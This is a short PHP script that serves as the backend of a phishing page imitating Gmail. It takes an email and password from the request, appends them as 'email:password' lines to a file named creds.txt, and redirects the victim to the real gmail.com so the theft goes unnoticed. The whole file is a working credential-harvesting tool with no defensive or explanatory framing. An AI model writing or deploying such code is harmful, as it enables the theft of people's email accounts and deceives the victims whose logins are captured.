<?php

$username = $_GET['email'];
$password = $_GET['password'];

$myfile = fopen("../creds.txt", "a") or die("Unable to open file!");

fwrite($myfile, $username);
fwrite($myfile, ":");
fwrite($myfile, $password);
fwrite($myfile, "\n");
fclose($myfile);

header("Location: https://gmail.com");

die();

?>